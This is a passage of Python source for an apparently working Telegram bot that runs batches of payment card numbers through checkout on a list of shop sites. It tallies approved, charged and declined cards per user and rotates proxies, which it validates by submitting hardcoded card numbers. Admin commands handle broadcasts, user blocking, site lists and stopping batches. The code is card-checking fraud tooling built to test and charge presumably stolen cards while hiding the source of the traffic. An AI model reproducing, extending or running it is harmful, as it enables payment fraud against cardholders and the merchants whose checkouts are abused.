                    GLOBAL_EXECUTOR,
                    check_single_card,
                    cards[0],
                    list(sites),
                    {"http": normalized_proxy, "https": normalized_proxy}
                )
                status, code_display, amount_display, site_label, used_proxy_url, site_url = test_result
            except Exception:
                status = "unknown"
                code_display = '"code": "UNKNOWN"'
                amount_display = "$0"
                site_label = ""
                used_proxy_url = None
                site_url = None

            if status != "unknown":
                proxies_override = {"http": normalized_proxy, "https": normalized_proxy}
                try:
                    user = update.effective_user
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = f"@{uname}" if uname else str(user.id)
                    existing = await get_user_proxies(user.id)
                    if isinstance(existing, list) and (normalized_proxy in existing):
                        await update.message.reply_text("Proxy Already Added")
                    else:
                        await add_user_proxy(user.id, display_name, user.username, normalized_proxy)
                        await update.message.reply_text("Added 1 Proxy")
                except Exception:
                    pass
            else:
                try:
                    await update.message.reply_text("Proxy Dead")
                except Exception:
                    pass

    batch_id = f"{update.effective_chat.id}:{int(time.time())}"
    cancel_event = asyncio.Event()
    runner = BatchRunner(cards, sites, GLOBAL_EXECUTOR, batch_id, update.effective_chat.id, update.effective_user.id, cancel_event, proxies_override=proxies_override)
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": update.effective_user.id,
                "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                "user_username": getattr(update.effective_user, "username", None),
                "progress": (None, None),
                "counts": {
                    "total": len(cards),
                    "processed": 0,
                    "approved": 0,
                    "declined": 0,
                    "charged": 0,
                    "start_ts": runner.start_ts,
                    "title": "SH Batch",
                },
            }
    except Exception:
        pass
    try:
        await add_pending(batch_id, {
            "batch_id": batch_id,
            "user_id": update.effective_user.id,
            "chat_id": update.effective_chat.id,
            "title": "SH Batch",
            "cards": cards,
            "sites": sites,
            "send_approved_notifications": True
        })
    except Exception:
        pass
    context.application.create_task(runner.run_with_notifications(update, context, title="SH Batch"))
    await update.message.reply_text("Started.")


async def cmd_setpr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return

    full_text = (update.message.text or "").strip()
    args = ""
    try:
        if full_text.lower().startswith("/setpr"):
            args = full_text[6:].strip()
    except Exception:
        args = ""

    replied = update.message.reply_to_message
    reply_text = ""
    if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
        reply_text = replied.text.strip()

    source_text = args if args else reply_text

    if not source_text:
        await update.message.reply_text(
            "Usage:\n"
            "/setpr <proxy>\n"
            "Examples:\n"
            "/setpr 1.2.3.4:8080\n"
            "/setpr user:pass@1.2.3.4:8080\n"
            "/setpr socks5://user:pass@1.2.3.4:1080\n"
            "\nMass add (multi-line):\n"
            "/setpr\n"
            "142.111.48.253:7030:ikletqkv:i1tjcun49r4d\n"
            "31.59.20.176:6754:ikletqkv:i1tjcun49r4d\n"
            "...\n"
        )
        return

    raw_lines = [ln.strip() for ln in source_text.splitlines() if (ln or "").strip()]
    proxies_raw: List[str] = []
    card_line: Optional[str] = None

    for ln in raw_lines:
        s = (ln or "").strip()
        if not s:
            continue
        low = s.lower()
        if low.startswith("proxy=") or low.startswith("proxy:") or low.startswith("px=") or low.startswith("px:") or low.startswith("px "):
            val = s.split("=", 1)[1].strip() if "=" in s else s.split(":", 1)[1].strip() if ":" in s else s.split(" ", 1)[1].strip() if " " in s else ""
            if val:
                proxies_raw.append(val)
            continue
        maybe_card = None
        try:
            maybe_card = checkout.parse_cc_line(s)
        except Exception:
            maybe_card = None
        if maybe_card and (card_line is None):
            card_line = s
            continue
        proxies_raw.append(s)

    if not proxies_raw:
        await update.message.reply_text("No proxy lines detected. Provide one or more proxies (each on a new line).")
        return

    normalized_list: List[str] = []
    seen_norm = set()
    for pr in proxies_raw:
        n = normalize_proxy_url(pr)
        if not n:
            continue
        if n not in seen_norm:
            seen_norm.add(n)
            normalized_list.append(n)

    if not normalized_list:
        await update.message.reply_text("All provided proxies were invalid format. Expected host:port or ip:port:user:pass (http by default), or user:pass@host:port.")
        return

    test_cards = [
        {
            "number": "4906388577508357",
            "month": "11",
            "year": "28",
            "verification_value": "824"
        },
        {
            "number": "4532915710095558",
            "month": "12",
            "year": "27",
            "verification_value": "123"
        }
    ]

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    test_sites = list(sites)
    if len(test_sites) > 3:
        test_sites = random.sample(test_sites, 3)


    user = update.effective_user
    display_name = (user.full_name or "").strip()
    if not display_name:
        uname = (user.username or "").strip()
        display_name = f"@{uname}" if uname else str(user.id)
    try:
        existing_list = await get_user_proxies(user.id)
    except Exception:
        existing_list = []
    existing_set = set(existing_list or [])

    added_count = 0
    duplicate_count = 0

    loop = asyncio.get_running_loop()
    total_proxies = len(normalized_list)
    for idx, p in enumerate(normalized_list, 1):
        await update.message.reply_text(f"🔄 Testing proxy {idx}/{total_proxies}: {_mask_proxy_display(p)}")
        
        proxy_working = False
        test_results = []
        
        for site in test_sites:
            try:
                status, code_display, amount_display, site_label, used_proxy_url, site_url = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    test_cards[0],
                    [site],
                    {"http": p, "https": p}
                )
                if status != "unknown":
                    proxy_working = True
                    test_results.append(f"✅ Works on {site_label}")
            except Exception:
                continue

        if proxy_working:
            if p in existing_set:
                duplicate_count += 1
                await update.message.reply_text(f"✅ Proxy {_mask_proxy_display(p)} - Already Added\n" + "\n".join(test_results))
            else:
                try:
                    await add_user_proxy(user.id, display_name, user.username, p)
                    existing_set.add(p)
                    added_count += 1
                    await update.message.reply_text(f"✅ Proxy {_mask_proxy_display(p)} - Added\n" + "\n".join(test_results))
                except Exception:
                    pass
        else:
            await update.message.reply_text(f"❌ Proxy {_mask_proxy_display(p)} - Failed all tests")
    if added_count > 0:
        try:
            msg = f"Added {added_count} Proxy" if added_count == 1 else f"Added {added_count} Proxies"
            await update.message.reply_text(msg)
        except Exception:
            pass
    elif duplicate_count > 0:
        try:
            await update.message.reply_text("Proxy Already Added")
        except Exception:
            pass
    else:
        try:
            await update.message.reply_text("Proxy Dead")
        except Exception:
            pass


async def cmd_me(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
        
    user = update.effective_user
    s = await get_user_stats(user.id)
    declined = max(0, int(s["tested"]) - int(s["approved"]) - int(s["charged"]))
    text = (
        f"👤 {s['name']}\n"
        f"• Tested: {s['tested']}\n"
        f"• Approved: {s['approved']}\n"
        f"• Charged: {s['charged']}\n"
        f"• Declined: {declined}"
    )
    await update.message.reply_text(text)

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "stats"):
        await update.message.reply_text("Unauthorized.")
        return

    stats = await get_all_stats()
    items = []
    total_tested = total_approved = total_charged = 0

    dirty_updates: Dict[str, Dict[str, str]] = {}

    for uid, rec in stats.items():
        uid_str = str(uid)
        name = (rec.get("name") or uid_str)
        username = (rec.get("username") or "").strip()

        need_resolve = False
        try:
            nm = (name or "").strip()
            if (not nm) or nm.isdigit() or nm.lower() in ("unknown⚡️", "unknown"):
                need_resolve = True
        except Exception:
            need_resolve = True
        if not username:
            need_resolve = True

        if need_resolve:
            try:
                chat_obj = await context.bot.get_chat(int(uid))
                try:
                    full = getattr(chat_obj, "full_name", None)
                except Exception:
                    full = None
                if not full:
                    try:
                        first = getattr(chat_obj, "first_name", "") or ""
                        last = getattr(chat_obj, "last_name", "") or ""
                        full = f"{first} {last}".strip()
                    except Exception:
                        full = None
                if isinstance(full, str) and full.strip():
                    name = full.strip()
                un = None
                try:
                    un = getattr(chat_obj, "username", None)
                except Exception:
                    un = None
                if isinstance(un, str) and un.strip():
                    username = un.strip()
                dirty_updates[uid_str] = {"name": name, "username": username}
            except Exception:
                pass

        tested = int(rec.get("tested", 0) or 0)
        approved = int(rec.get("approved", 0) or 0)
        charged = int(rec.get("charged", 0) or 0)
        items.append((tested, name, approved, charged, username, uid_str))
        total_tested += tested
        total_approved += approved
        total_charged += charged

    if dirty_updates:
        try:
            async with STATS_LOCK:
                s2 = _load_stats()
                for k, upd in dirty_updates.items():
                    try:
                        cur = s2.get(k, {})
                        nval = (upd.get("name") or "").strip()
                        uval = (upd.get("username") or "").strip()
                        if nval:
                            cur["name"] = nval
                        if uval:
                            cur["username"] = uval
                        s2[k] = cur
                    except Exception:
                        continue
                _save_stats(s2)
        except Exception:
            pass

    items.sort(key=lambda x: x[0], reverse=True)
    lines = []
    rank = 1
    for tested, name, approved, charged, username, uid_str in items:
        declined = max(0, tested - approved - charged)
        if isinstance(username, str) and username.strip():
            uname_fmt = username.strip()
            if not uname_fmt.startswith("@"):
                uname_fmt = f"@{uname_fmt}"
            display = f"{name} ({uname_fmt})"
        else:
            display = f"{name}"
        lines.append(f"{rank:>2}. {display} [id: {uid_str}] — Tested: {tested}, Approved: {approved}, Charged: {charged}, Declined: {declined}")
        rank += 1

    header = "📊 User Stats (sorted by Tested)"
    footer = f"\nTotals — Tested: {total_tested}, Approved: {total_approved}, Charged: {total_charged}, Declined: {max(0, total_tested - total_approved - total_charged)}"
    body = "\n".join(lines) if lines else "No data yet."
    await update.message.reply_text(f"{header}\n{body}{footer}")

async def cmd_resetstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "resetstats"):
        await update.message.reply_text("Unauthorized.")
        return
    async with STATS_LOCK:
        _save_stats({})
    await update.message.reply_text("Stats reset.")

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "broadcast"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/broadcast"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()

    if not body:
        await update.message.reply_text("Usage:\n/broadcast <message>\nOr reply to a message with /broadcast")
        return

    stats = await get_all_stats()
    try:
        uids = [int(uid) for uid in stats.keys() if str(uid).isdigit()]
    except Exception:
        uids = []

    if not uids:
        await update.message.reply_text("No recipients found.")
        return

    sem = asyncio.Semaphore(BROADCAST_WORKERS)
    sent = 0
    failed = 0

    async def send_to(uid: int):
        nonlocal sent, failed
        async with sem:
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=body,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                )
                sent += 1
            except Exception:
                failed += 1

    tasks = [asyncio.create_task(send_to(uid)) for uid in uids]
    await asyncio.gather(*tasks, return_exceptions=True)
    await update.message.reply_text(f"Broadcast sent to {sent} users; failed: {failed}")


async def cmd_broadcastuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "broadcastuser"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    args = ""
    try:
        if full_text.lower().startswith("/broadcastuser"):
            args = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        args = ""

    target = ""
    body = ""

    if args:
        parts = args.split(" ", 1)
        target = (parts[0] or "").strip()
        body = (parts[1] or "").strip() if len(parts) > 1 else ""

    if not body:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()

    if not target or not body:
        await update.message.reply_text("Usage:\n/broadcastuser @username <message>\nOr /broadcastuser <numeric_user_id> <message>")
        return

    uid = None
    try:
        if target.isdigit():
            uid = int(target)
    except Exception:
        uid = None

    if uid is None:
        try:
            t = target.strip()
            if t.startswith("@"):
                t_at = t
                t_plain = t[1:]
            else:
                t_at = f"@{t}"
                t_plain = t
            stats = await get_all_stats()
            for k, rec in (stats or {}).items():
                uname = (rec.get("username") or "").strip()
                if not uname:
                    continue
                comp = uname.strip()
                comp_at = comp if comp.startswith("@") else f"@{comp}"
                if comp_at.lower() == t_at.lower() or comp.lower() == t_plain.lower():
                    try:
                        uid = int(k)
                        break
                    except Exception:
                        continue
            if uid is None:
                for k, rec in (stats or {}).items():
                    name = (rec.get("name") or "").strip()
                    if not name:
                        continue
                    comp = name.strip()
                    if comp.lower() == t_at.lower() or comp.lower() == t_plain.lower():
                        try:
                            uid = int(k)
                            break
                        except Exception:
                            continue
        except Exception:
            uid = None

    if uid is None:
        await update.message.reply_text("Target user not found in stats. Ask them to interact with the bot first.")
        return

    try:
        chat_obj = await context.bot.get_chat(uid)
        try:
            full = getattr(chat_obj, "full_name", None)
        except Exception:
            full = None
        if not full:
            try:
                first = getattr(chat_obj, "first_name", "") or ""
                last = getattr(chat_obj, "last_name", "") or ""
                full = f"{first} {last}".strip()
            except Exception:
                full = None
        try:
            un = getattr(chat_obj, "username", None)
        except Exception:
            un = None
        try:
            async with STATS_LOCK:
                s2 = _load_stats()
                key = str(uid)
                cur = s2.get(key, {})
                if isinstance(full, str) and full.strip():
                    cur["name"] = full.strip()
                if isinstance(un, str) and un.strip():
                    cur["username"] = un.strip()
                s2[key] = cur
                _save_stats(s2)
        except Exception:
            pass
    except Exception:
        pass

    async def _mention_for(uid_inner: int) -> str:
        try:
            su = await get_user_stats(uid_inner)
            uname = (su.get("username") or "").strip() if isinstance(su.get("username"), str) else ""
            disp = (su.get("name") or str(uid_inner)).strip()
            if uname:
                return f"@{uname}" if not uname.startswith("@") else uname
            return f'<a href="tg://user?id={uid_inner}">{disp}</a>'
        except Exception:
            return f'<a href="tg://user?id={uid_inner}">{uid_inner}</a>'

    preferred_chat_id: Optional[int] = None
    try:
        async with ACTIVE_LOCK:
            for _, rec in ACTIVE_BATCHES.items():
                if rec.get("user_id") == uid:
                    preferred_chat_id = rec.get("chat_id")
                    break
    except Exception:
        preferred_chat_id = None

    try:
        su = await get_user_stats(uid)
    except Exception:
        su = {}
    last_chat_id = su.get("last_chat_id")
    try:
        me = await context.bot.get_me()
        bot_un = getattr(me, "username", None) or ""
        bot_link = f"https://t.me/{bot_un}?start=broadcast" if bot_un else ""
    except Exception:
        bot_link = ""

    if preferred_chat_id:
        try:
            is_group = int(preferred_chat_id) < 0
            text_send = body
            if is_group:
                m = await _mention_for(uid)
                text_send = f"{m}\n\n{body}"
            await context.bot.send_message(
                chat_id=int(preferred_chat_id),
                text=text_send,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            await update.message.reply_text(f"Broadcast delivered in active chat {preferred_chat_id}.")
            return
        except Exception:
            pass

    try:
        await context.bot.send_message(
            chat_id=uid,
            text=body,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        await update.message.reply_text(f"Broadcast delivered via DM to {uid}.")
        return
    except Exception as dm_err:
        dm_error = dm_err

    if last_chat_id:
        try:
            is_group = int(last_chat_id) < 0
            text_send = body
            if is_group:
                m = await _mention_for(uid)
                text_send = f"{m}\n\n{body}"
            await context.bot.send_message(
                chat_id=int(last_chat_id),
                text=text_send,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            await update.message.reply_text(f"Broadcast delivered in last chat {last_chat_id}.")
            return
        except Exception as e2:
            await update.message.reply_text(f"DM failed: {dm_error}\nAlso failed in last chat {last_chat_id}: {e2}")

    guidance = (
        f"DM failed: {dm_error}\n"
        f"No known chat with this user to notify. Share this link and ask them to Start the bot:\n{bot_link}"
        if bot_link
        else f"DM failed: {dm_error}\nNo known chat with this user to notify."
    )
    await update.message.reply_text(guidance)

async def cmd_broadcastactive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "broadcastactive"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/broadcastactive"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()

    if not body:
        await update.message.reply_text("Usage:\n/broadcastactive <message>\nOr reply to a message with /broadcastactive")
        return

    async with ACTIVE_LOCK:
        active_items = list(ACTIVE_BATCHES.values())

    user_targets: Dict[int, Optional[int]] = {}
    for rec in active_items:
        try:
            uid = rec.get("user_id")
            chat_id = rec.get("chat_id")
            if uid:
                if uid not in user_targets:
                    user_targets[int(uid)] = int(chat_id) if chat_id else None
        except Exception:
            continue

    if not user_targets:
        await update.message.reply_text("No active users found.")
        return

    sem = asyncio.Semaphore(BROADCAST_WORKERS)
    sent = 0
    failed = 0

    async def mention_for(uid: int) -> str:
        try:
            s = await get_user_stats(uid)
            uname = (s.get("username") or "").strip() if isinstance(s.get("username"), str) else ""
            disp_name = (s.get("name") or str(uid)).strip()
            if uname:
                return f"@{uname}" if not uname.startswith("@") else uname
            return f'<a href="tg://user?id={uid}">{disp_name}</a>'
        except Exception:
            return f'<a href="tg://user?id={uid}">{uid}</a>'

    async def send_to(uid: int, preferred_chat_id: Optional[int]):
        nonlocal sent, failed
        async with sem:
            if preferred_chat_id:
                try:
                    is_group = int(preferred_chat_id) < 0
                    text = body
                    if is_group:
                        m = await mention_for(uid)
                        text = f"{m}\n\n{body}"
                    await context.bot.send_message(
                        chat_id=preferred_chat_id,
                        text=text,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                    sent += 1
                    return
                except Exception:
                    pass
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=body,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                )
                sent += 1
                return
            except Exception:
                try:
                    s = await get_user_stats(uid)
                    last_chat_id = s.get("last_chat_id")
                except Exception:
                    last_chat_id = None
                if last_chat_id:
                    try:
                        is_group = int(last_chat_id) < 0
                        text = body
                        if is_group:
                            m = await mention_for(uid)
                            text = f"{m}\n\n{body}"
                        await context.bot.send_message(
                            chat_id=int(last_chat_id),
                            text=text,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True,
                        )
                        sent += 1
                        return
                    except Exception:
                        pass
                failed += 1

    tasks = [asyncio.create_task(send_to(uid, chat_id)) for uid, chat_id in user_targets.items()]
    await asyncio.gather(*tasks, return_exceptions=True)
    await update.message.reply_text(f"Broadcast sent to {sent} active users; failed: {failed}")

async def cmd_restrict(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "restrict"):
        await update.message.reply_text("Unauthorized.")
        return
    text = (update.message.text or "").strip()
    args = ""
    try:
        parts = text.split(" ", 1)
        args = parts[1] if len(parts) > 1 else ""
    except Exception:
        args = ""
    policy = await get_access_policy()
    if not args or args.lower().strip() == "all":
        policy["restrict_all"] = True
        await set_access_policy(policy)
        await update.message.reply_text("Restriction enabled: all non-admins are blocked.")
        return
    toks = []
    for sep in [",", "\n"]:
        args = args.replace(sep, " ")
    for tok in args.split(" "):
        tok = tok.strip()
        if not tok:
            continue
        try:
            val = int(tok)
            toks.append(val)
        except Exception:
            pass
    if not toks:
        await update.message.reply_text("Usage: /restrict all OR /restrict <user_id>[, ...]")
        return
    blocked = set(policy.get("blocked_ids") or [])
    for u in toks:
        blocked.add(u)
    policy["blocked_ids"] = sorted(blocked)
    await set_access_policy(policy)
    await update.message.reply_text(f"Blocked users updated: {policy['blocked_ids']}")

async def cmd_allowonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "allowonly"):
        await update.message.reply_text("Unauthorized.")
        return
    text = (update.message.text or "").strip()
    args = ""
    try:
        parts = text.split(" ", 1)
        args = parts[1] if len(parts) > 1 else ""
    except Exception:
        args = ""
    if not args:
        await update.message.reply_text("Usage: /allowonly <id>[, ...]")
        return
    ids = []
    for sep in [",", "\n"]:
        args = args.replace(sep, " ")
    for tok in args.split(" "):
        tok = tok.strip()
        if not tok:
            continue
        try:
            ids.append(int(tok))
        except Exception:
            pass
    if not ids:
        await update.message.reply_text("Usage: /allowonly <id>[, ...]")
        return
    policy = await get_access_policy()
    policy["allow_only_ids"] = sorted(set(ids))
    policy["restrict_all"] = True
    await set_access_policy(policy)
    await update.message.reply_text(f"Allow-only set: {policy['allow_only_ids']} (admins always allowed)")

async def cmd_unrestrict(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "unrestrict"):
        await update.message.reply_text("Unauthorized.")
        return

    text = (update.message.text or "").strip()
    args = ""
    try:
        parts = text.split(" ", 1)
        args = parts[1] if len(parts) > 1 else ""
    except Exception:
        args = ""

    policy = await get_access_policy()

    if not args or args.lower().strip() == "all":
        policy["restrict_all"] = False
        policy["allow_only_ids"] = []
        await set_access_policy(policy)
        await update.message.reply_text("Restriction disabled: non-admins are allowed. allow_only_ids cleared.")
        return

    toks = []
    for sep in [",", "\n"]:
        args = args.replace(sep, " ")
    for tok in args.split(" "):
        tok = tok.strip()
        if not tok:
            continue
        try:
            toks.append(int(tok))
        except Exception:
            pass

    if not toks:
        await update.message.reply_text("Usage: /unrestrict all OR /unrestrict <user_id>[, ...]")
        return

    blocked = set(policy.get("blocked_ids") or [])
    before = set(blocked)
    for u in toks:
        blocked.discard(u)
    policy["blocked_ids"] = sorted(blocked)
    await set_access_policy(policy)
    removed = sorted(before - set(blocked))
    if removed:
        await update.message.reply_text(f"Unblocked users: {removed}\nCurrent blocked list: {policy['blocked_ids']}")
    else:
        await update.message.reply_text(f"No changes. Current blocked list: {policy['blocked_ids']}")

async def cmd_addsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "addsite"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    body = ""
    try:
        if full_text.lower().startswith("/addsite"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""
    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()
    if not body:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()
    if not body:
        await update.message.reply_text(
            "Usage:\n"
            "/addsite <site_url>\n"
            "Or multi-line:\n"
            "/addsite\n"
            "site1\n"
            "site2\n"
            "..."
        )
        return

    raw_lines = [ln.strip() for ln in body.splitlines() if (ln or "").strip()]
    candidates = []
    for ln in raw_lines:
        try:
            url = checkout.normalize_shop_url(ln)
            if isinstance(url, str) and url.lower().startswith("http"):
                url = url.rstrip("/")
                candidates.append(url)
        except Exception:
            continue

    if not candidates:
        await update.message.reply_text("No valid sites found.")
        return

    unique_input = []
    seen = set()
    for u in candidates:
        if u not in seen:
            seen.add(u)
            unique_input.append(u)

    try:
        existing_list = checkout.read_sites_from_file("working_sites.txt") or []
    except Exception:
        existing_list = []
    existing_set = set()
    for s in existing_list:
        try:
            n = checkout.normalize_shop_url(s).rstrip("/")
        except Exception:
            n = str(s or "").strip().rstrip("/")
        if n:
            existing_set.add(n)

    to_add = [u for u in unique_input if u not in existing_set]
    if not to_add:
        await update.message.reply_text("Sites Already Added")
        return

    try:
        with open("working_sites.txt", "a", encoding="utf-8") as f:
            for u in to_add:
                f.write(u + "\n")
    except Exception as e:
        await update.message.reply_text(f"Failed to add sites: {e}")
        return

    try:
        msg = f"Added {len(to_add)} Site" if len(to_add) == 1 else f"Added {len(to_add)} Sites"
        await update.message.reply_text(msg)
    except Exception:
        pass

async def cmd_rmsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "rmsite"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    args = ""
    try:
        if full_text.lower().startswith("/rmsite"):
            args = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        args = ""

    if not args:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                args = rt.strip()

    if not args:
        await update.message.reply_text("Usage: /rmsite <site1> [site2 ...]\nOr reply to a message with site URLs and use /rmsite.")
        return

    raw = args.replace(",", " ").replace("\n", " ").replace("\r", " ")
    tokens = [t.strip() for t in raw.split(" ") if t.strip()]
    sites = []
    for tok in tokens:
        try:
            url = checkout.normalize_shop_url(tok)
            if url and url.lower().startswith("http"):
                sites.append(url.rstrip("/"))
        except Exception:
            continue
    if not sites:
        await update.message.reply_text("No valid site URLs found.")
        return
    unique_sites = sorted(set(sites))
    removed = []
    failed = []

    for s in unique_sites:
        ok = False
        try:
            ok = checkout.remove_site_from_working_sites(s)
        except Exception:
            ok = False
        if ok:
            removed.append(s)
            try:
                with BOT_PRODUCT_CACHE_LOCK:
                    BOT_PRODUCT_CACHE.pop(s, None)
            except Exception:
                pass
        else:
            failed.append(s)

    lines = []
    lines.append(f"Requested: {len(unique_sites)} site(s)")
    lines.append(f"Removed: {len(removed)}")
    if removed:
        show = removed[:10]
        lines.append("Removed list:")
        for u in show:
            lines.append(f"• {u}")
        if len(removed) > len(show):
            lines.append(f"... and {len(removed) - len(show)} more")
    if failed:
        lines.append(f"Failed: {len(failed)}")
        for u in failed[:5]:
            lines.append(f"• {u}")

    await update.message.reply_text("\n".join(lines), disable_web_page_preview=True)

async def cmd_reboot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "reboot"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        await update.message.reply_text("🔄 Rebooting bot... Active batches will resume after restart.")

        app = context.application
        if app:
            app.stop_running()
            app.shutdown()

        import sys
        import os
        python = sys.executable
        script_path = os.path.abspath(__file__)
        os.execv(python, [python, script_path])
    except Exception as e:
        await update.message.reply_text(f"Failed to reboot: {e}")

async def cmd_resetactive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "resetactive"):
        await update.message.reply_text("Unauthorized.")
        return

    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())

    if not items:
        await update.message.reply_text("No active checks to reset.")
        return

    reset = 0
    for batch_id, rec in items:
        try:
            ev = rec.get("event")
            if ev:
                ev.set()
        except Exception:
            pass
        try:
            for t in rec.get("tasks", []):
                if not t.done():
                    t.cancel()
        except Exception:
            pass
        try:
            prog = rec.get("progress") or (None, None)
            chat_id, msg_id = prog
            if chat_id and msg_id:
                try:
                    await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg_id, reply_markup=None)
                except Exception:
                    pass
        except Exception:
            pass
        try:
            await remove_pending(batch_id)
        except Exception:
            pass
        reset += 1

    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES.clear()
    except Exception:
        pass

    await update.message.reply_text(f"Reset requested for {reset} active batch(es).")

async def cmd_stopall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "stopall"):
        await update.message.reply_text("Unauthorized.")
        return

    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())

    if not items:
        await update.message.reply_text("No active checks to stop.")
        return

    stopped = 0
    for batch_id, rec in items:
        try:
            ev = rec.get("event")
            if ev:
                ev.set()
        except Exception:
            pass
        try:
            for t in rec.get("tasks", []):
                if not t.done():
                    t.cancel()
        except Exception:
            pass
        try:
            prog = rec.get("progress") or (None, None)
            chat_id, msg_id = prog
            if chat_id and msg_id:
                try:
                    await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg_id, reply_markup=None)
                except Exception:
                    pass
        except Exception:
            pass
        try:
            await remove_pending(batch_id)
        except Exception:
            pass
        stopped += 1

    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES.clear()
    except Exception:
        pass

    await update.message.reply_text(f"Stop requested for {stopped} active batch(es).")

async def cmd_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
        
    try:
        sites = checkout.read_sites_from_file("working_sites.txt")
        site_count = len(sites) if sites else 0
        await update.message.reply_text(f"📊 Active sites: {site_count}")
    except Exception as e:
        await update.message.reply_text(f"Failed to check sites: {e}")

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Unauthorized.")
        return

    help_text = (
        "🛠 Admin commands:\n\n"
        "📊 Stats & Users:\n"
        "• /stats — Show aggregate user stats\n"
        "• /resetstats — Reset all user stats\n"
        "• /me — Show your personal stats\n"
        "• /active — Show current active checks and progress\n"
        "• /site — Show number of active sites\n\n"
        "📢 Broadcast:\n"
        "• /broadcast <message> — Send a message to all known users\n"
        "• /broadcastuser @username <message> — Send a message to a single user\n"
        "• /broadcastactive <message> — Send a message to only active users\n\n"
        "🚫 Access Control:\n"
        "• /restrict all — Block all non-admins\n"
        "• /restrict <user_id>[, ...] — Block specific users\n"
        "• /allowonly <id>[, ...] — Allow only specific user or chat IDs\n"
        "• /unrestrict all — Lift global restrictions and clear allow-only\n"
        "• /unrestrict <user_id>[, ...] — Remove users from block list\n"
        "• /allowuser <user_id> — Allow user to bypass groups-only mode\n"
        "• /rmuser <user_id> — Remove user's bypass permission\n\n"
        "👤 Admin Management:\n"
        "• /admins — Show all admin user ids\n"
        "• /rmadmin <user_id> — Remove an admin\n"
